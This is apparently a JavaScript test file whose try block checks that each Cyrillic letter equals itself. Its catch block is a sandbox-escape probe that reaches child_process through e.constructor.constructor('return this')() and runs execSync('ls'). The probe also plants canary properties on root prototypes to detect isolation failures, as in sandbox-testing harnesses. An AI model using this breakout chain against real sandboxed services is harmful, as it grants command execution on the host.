try {
    if ('а' !== 'а') {
        $ERROR('#а');
    }
    if ('б' !== 'б') {
        $ERROR('#б');
    }
    if ('в' !== 'в') {
        $ERROR('#в');
    }
    if ('г' !== 'г') {
        $ERROR('#г');
    }
    if ('д' !== 'д') {
        $ERROR('#д');
    }
    if ('е' !== 'е') {
        $ERROR('#е');
    }
    if ('ж' !== 'ж') {
        $ERROR('#ж');
    }
    if ('з' !== 'з') {
        $ERROR('#з');
    }
    if ('и' !== 'и') {
        $ERROR('#и');
    }
    if ('й' !== 'й') {
        $ERROR('#й');
    }
    if ('к' !== 'к') {
        $ERROR('#к');
    }
    if ('л' !== 'л') {
        $ERROR('#л');
    }
    if ('м' !== 'м') {
        $ERROR('#м');
    }
    if ('н' !== 'н') {
        $ERROR('#н');
    }
    if ('о' !== 'о') {
        $ERROR('#о');
    }
    if ('п' !== 'п') {
        $ERROR('#п');
    }
    if ('р' !== 'р') {
        $ERROR('#р');
    }
    if ('с' !== 'с') {
        $ERROR('#с');
    }
    if ('т' !== 'т') {
        $ERROR('#т');
    }
    if ('у' !== 'у') {
        $ERROR('#у');
    }
    if ('ф' !== 'ф') {
        $ERROR('#ф');
    }
    if ('х' !== 'х') {
        $ERROR('#х');
    }
    if ('ц' !== 'ц') {
        $ERROR('#ц');
    }
    if ('ч' !== 'ч') {
        $ERROR('#ч');
    }
    if ('ш' !== 'ш') {
        $ERROR('#ш');
    }
    if ('щ' !== 'щ') {
        $ERROR('#щ');
    }
    if ('ъ' !== 'ъ') {
        $ERROR('#ъ');
    }
    if ('ы' !== 'ы') {
        $ERROR('#ы');
    }
    if ('ь' !== 'ь') {
        $ERROR('#ь');
    }
    if ('э' !== 'э') {
        $ERROR('#э');
    }
    if ('ю' !== 'ю') {
        $ERROR('#ю');
    }
    if ('я' !== 'я') {
        $ERROR('#я');
    }
    if ('ё' !== 'ё') {
        $ERROR('#ё');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}